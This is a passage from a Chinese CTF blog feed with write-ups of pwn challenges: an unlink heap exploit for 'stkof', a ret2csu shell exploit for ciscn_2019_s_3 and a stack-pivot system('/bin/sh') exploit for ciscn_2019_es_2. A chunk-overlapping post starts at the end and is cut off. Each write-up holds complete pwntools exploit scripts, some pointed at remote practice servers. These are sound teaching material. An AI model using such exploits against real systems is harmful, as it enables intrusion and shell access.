python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./stkof&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x4009E6&#x27;)#alloc</span></span><br><span class="line">db(<span class="string">&#x27;b* 0x400AE3&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BA7&#x27;) #free</span></span><br><span class="line">head=<span class="number">0x602140</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(head+<span class="number">16</span>-<span class="number">0x18</span>)+p64(head+<span class="number">16</span>-<span class="number">0x10</span>)+p64(<span class="number">0x00</span>)+p64(<span class="number">0x6666</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们找到或伪造地址里面的值是伪造的chunkP的地址值</p><ul><li><p>一个地址</p><blockquote><p>我们把该地址tar，tar-0x18填入fd绕过FD+0x18&#x3D;P，tar-0x10填入bk绕过BK+0x10&#x3D;P</p><p>最终实现效果是在该tar地址写入tar-0x18</p></blockquote></li><li><p>两个地址</p><blockquote><p>tar1 和 tar2 tar1-0x18写入fd，tar2-0x10写入bk</p><p>tar1地址写入tar2-0x10|bk值</p><p>tar2地址写入tar1-0x18|fd值</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_3</title>
      <link href="/2023/03/13/ciscn-2019-s-3/"/>
      <url>/2023/03/13/ciscn-2019-s-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3">https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn$ checksec ciscn_2019_s_3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/ciscn_2019_s_3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h2><p>大体上main里只有vuln这一个函数，buf会溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED</span><br><span class="line">.text:00000000004004ED                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED 55                            push    rbp</span><br><span class="line">.text:00000000004004EE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000004004F4 BA 00 04 00 00                mov     edx, 400h                       ; count</span><br><span class="line">.text:00000000004004F9 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:00000000004004FE 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400501 0F 05                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503 48 C7 C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:000000000040050A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; count</span><br><span class="line">.text:000000000040050F 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:0000000000400514 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400517 0F 05                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519 C3                            retn</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               vuln endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051A 90                            db 90h</span><br><span class="line">.text:000000000040051B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051B 5D                            pop     rbp</span><br><span class="line">.text:000000000040051C C3                            retn</span><br></pre></td></tr></table></figure><p>有gadget,看到3b&#x3D;59系统调用号，<code>#define __NR_execve 59</code>，可以配合syscall起shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6                               public gadgets</span><br><span class="line">.text:00000000004004D6                               gadgets proc near</span><br><span class="line">.text:00000000004004D6                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6 55                            push    rbp</span><br><span class="line">.text:00000000004004D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1 C3                            retn</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E1                               gadgets endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9 C3                            retn</span><br><span class="line">.text:00000000004004E9</span><br><span class="line">.text:00000000004004E9                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EA 90                            db 90h</span><br><span class="line">.text:00000000004004EB                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EB 5D                            pop     rbp</span><br><span class="line">.text:00000000004004EC C3                            retn</span><br></pre></td></tr></table></figure><p>这里我们我们可以从vuln汇编最后ret前没有常规的pop ebp等，只需覆盖到ebp就可以ret到hook函数，同时程序没有&#x2F;bin&#x2F;sh string，我们还需要自己构造</p><p>vuln函数 <code>mov     edx, 30h ; &#39;0&#39;</code>输入0x30字节，我们的buf只是在0x10位置会把ebp给输出来，我们可以利用泄露的ebp，来寻址我们的输入，通过输入构造binsh</p><h2 id="泄露ebp"><a href="#泄露ebp" class="headerlink" title="泄露ebp"></a>泄露ebp</h2><p>s(b’&#x2F;bin&#x2F;sh\x00’.ljust(0x10,b’a’)+p64(ret_fun))</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004045662.png" alt="image-20230313004045662"></p><p>我们泄露0x7ffed29ae428，输入在0x7ffed29ae310。</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004213386.png" alt="image-20230313004213386"></p><p>再次返回vuln函数，泄露地址-0x118，就可以得到输入栈地址</p><h2 id="ret2cmu-getshell"><a href="#ret2cmu-getshell" class="headerlink" title="ret2cmu getshell"></a>ret2cmu getshell</h2><h3 id="first-way"><a href="#first-way" class="headerlink" title="first way"></a>first way</h3><p>padding&#x3D;b’&#x2F;bin&#x2F;sh\x00’.ljust(0x10,b’a’)<br>payload&#x3D;padding+p64(csu_end)+p64(0)*2+p64(ebp+0x50)+p64(0)*3+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</p><p>这里我们要execve(“&#x2F;bin&#x2F;sh”,0,0)</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">将sys_execve 的调用号 59 赋值给 rax</span><br><span class="line">将第一个参数即字符串 &quot;/bin/sh&quot;的地址 赋值给 rdi</span><br><span class="line">将第二个参数 0  赋值给 rsi</span><br><span class="line">将第三个参数 0  赋值给 rdx</span><br></pre></td></tr></table></figure><p>rax,rdi,rsi 好说</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/pwn&gt; ROPgadget --binary &#x27;ciscn_2019_s_3&#x27; --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a2 : pop r15 ; ret</span><br><span class="line">0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400440 : pop rbp ; ret</span><br><span class="line">0x00000000004005a3 : pop rdi ; ret</span><br><span class="line">0x00000000004005a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004003a9 : ret</span><br></pre></td></tr></table></figure><p>rdx置零需要cmu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000400580 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400583 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400586 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400589 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:0000000000400589</span><br><span class="line">.text:000000000040058D 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400591 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594 75 EA                         jnz     short loc_400580</span><br><span class="line">.text:0000000000400594</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                               loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040059A 5B                            pop     rbx</span><br><span class="line">.text:000000000040059B 5D                            pop     rbp</span><br><span class="line">.text:000000000040059C 41 5C                         pop     r12</span><br><span class="line">.text:000000000040059E 41 5D                         pop     r13</span><br><span class="line">.text:00000000004005A0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004005A2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004005A4 C3                            retn</span><br><span class="line">.text:00000000004005A4                               ; &#125; // starts at 400540</span><br></pre></td></tr></table></figure><p>这里我们利用40059A处的rdi，再返回到0400580，可以控制rdx，同时将rbx置零，就会call [r12+rbx*8]里的内容，也就是说这里控制流会被劫持，我们将r12里的内容控制为我们原本要ret的mov_rax即可，只不过这里是call，有意思的就是这里</p><p>call mov_ret</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005704624.png" alt="image-20230313005704624" style="zoom:67%;"><p>call之后会返回到 add rbx,1</p><p>这个时候 rbp和rbp一定不相等，再次回到csu_front进行call [r12+rbx*8]&#x3D;call [r12+8]也就是我们的pop rdi指令</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005856293.png" alt="image-20230313005856293" style="zoom:67%;"><p>这次的pop rdi 会把call [r12+8] 的返回地址pop掉这样我们ret是执行流回到payload的mov rax上然后正常rop</p><h3 id="second-way"><a href="#second-way" class="headerlink" title="second way"></a>second way</h3><p>payload&#x3D;padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</p><p>payload+&#x3D;b’a’*48+p64(rdi)+p64(ebp)+p64(syscall)</p><p>这里就是用一个常规的ret2cmu，将ebp和rbx去符合cmp     rbx, rbp，不跳转的跳转最后再ret到pop rdi的执行流</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12_call,r13_a3,r14_a2,r15_a1,last_ret</span>):<span class="comment">#注意第三个参数是call的r12寄存器所存地址里的地址call    qword ptr [r12+rbx*8]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rbx=0</span></span><br><span class="line"><span class="string">    rbp=1</span></span><br><span class="line"><span class="string">    r12= call the address in address</span></span><br><span class="line"><span class="string">    r13= rdx third argument</span></span><br><span class="line"><span class="string">    r14= rsi second argument</span></span><br><span class="line"><span class="string">    r15= edi first argument </span></span><br><span class="line"><span class="string">    last= ret address   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=padding+fake_rbp+p64(cmu_end)+p64(rbx)+p64(rbp)+p64(r12_call)+p64(r13_a3)+p64(r14_a2)+p64(r15_a1)+p64(cmu_front)</span><br><span class="line">    payload+=fake_reg+p64(last_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment">#fake_reg一般56字节</span></span><br></pre></td></tr></table></figure><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011205443.png" alt="image-20230313011205443" style="zoom:67%;"><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011338278.png" alt="image-20230313011338278" style="zoom:67%;"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29483&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b *0x0400501&#x27;</span>)</span><br><span class="line">ret_fun=<span class="number">0x04004ED</span></span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(ret_fun))</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">ebp=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">padding=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#first way</span></span><br><span class="line">payload=padding+p64(csu_end)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ebp+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</span><br><span class="line"><span class="comment">#second way</span></span><br><span class="line"><span class="comment"># payload=padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</span></span><br><span class="line"><span class="comment"># payload+=b&#x27;a&#x27;*48+p64(rdi)+p64(ebp)+p64(syscall)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ret2cmu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_2</title>
      <link href="/2023/03/12/ciscn-2019-es-2/"/>
      <url>/2023/03/12/ciscn-2019-es-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2">https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/BUU&gt; checksec ciscn_2019_es_2 </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/BUU/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有0x8字节可控，有system函数在</p><p>考虑栈迁移，常规我们会往bss段迁移，但是这次可以泄露处ebp</p><h2 id="泄露ebp"><a href="#泄露ebp" class="headerlink" title="泄露ebp"></a>泄露ebp</h2><p>利用printf就可以泄露出ebp</p><p>padding&#x3D;b’a’*0x28<br>sa(b’name?\n’,padding)</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195405528.png" alt="image-20230312195405528" style="zoom: 80%;"><p>泄露出ebp&#x3D;0xff82fc88</p><h3 id="栈迁移到栈上"><a href="#栈迁移到栈上" class="headerlink" title="栈迁移到栈上"></a>栈迁移到栈上</h3><p>可以从什么看到泄露出来的ebp和我们输入的地方差0xff82fc88−0xff82fc50&#x3D;0x38</p><p>下次read也会往这个地方read，我们提前在上面布置好栈帧，将ebp覆盖为我们的输入点，也就是伪造的栈帧，再将返回地址覆盖为leave ret，这样mov esp，ebp，会到达输入点，</p><p>再pop ebp，输入点前四个字节输入junk即可，</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195704199.png" alt="image-20230312195704199" style="zoom:80%;"><p>再ret，这里我们就可以接管执行流，bin&#x2F;sh也可以利用泄露的栈和偏移进行确定</p><p>payload2&#x3D;b’junk’+p32(elf.symbols[‘system’])+p32(0x123)+p32(ebp+0x10)+b”&#x2F;bin&#x2F;sh”<br>payload2&#x3D;payload2.ljust(0x28,b’\x00’)<br>payload2+&#x3D;p32(ebp)+p32(leave_ret)</p><p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195856603.png" alt="image-20230312195856603"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b* 0x80485CD&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">sa(<span class="string">b&#x27;name?\n&#x27;</span>,padding)</span><br><span class="line">ru(padding)</span><br><span class="line">ebp=u32(io.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;junk&#x27;</span>+p32(elf.symbols[<span class="string">&#x27;system&#x27;</span>])+p32(<span class="number">0x123</span>)+p32(ebp+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp)+p32(leave_ret)</span><br><span class="line">sl(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2023/03/10/Chunk-Extend-and-Overlapping/"/>
      <url>/2023/03/10/Chunk-Extend-and-Overlapping/</url>
      
        <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec heapcreator</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>heaparray是一个在bss段的全局heap结构体数组</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size ;</span><br><span class="line">    <span class="type">char</span> *content ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>free后没有将content指针置零</p><p>在edit时还存在off by one漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( 